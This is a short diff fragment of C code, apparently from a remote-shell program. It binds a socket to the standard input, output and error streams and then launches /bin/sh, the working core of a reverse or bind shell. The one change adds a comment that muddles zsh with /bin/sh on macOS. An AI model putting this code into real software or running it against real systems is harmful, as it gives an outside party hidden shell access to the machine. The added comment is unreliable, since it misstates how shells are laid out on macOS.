@@ -29,7 +29,7 @@ dup2(sockhndl, 1); //stdout  "   "
 dup2(sockhndl, 2); // stderror "  "
 
 char *argv[] = {"/bin/sh", NULL};
-execve("/bin/sh", argv, NULL);
+execve("/bin/sh", argv, NULL); // for mac os use zsh its in /bin/sh
 }
 close(sockhndl);
 wait(NULL); // wait 4 child to exit
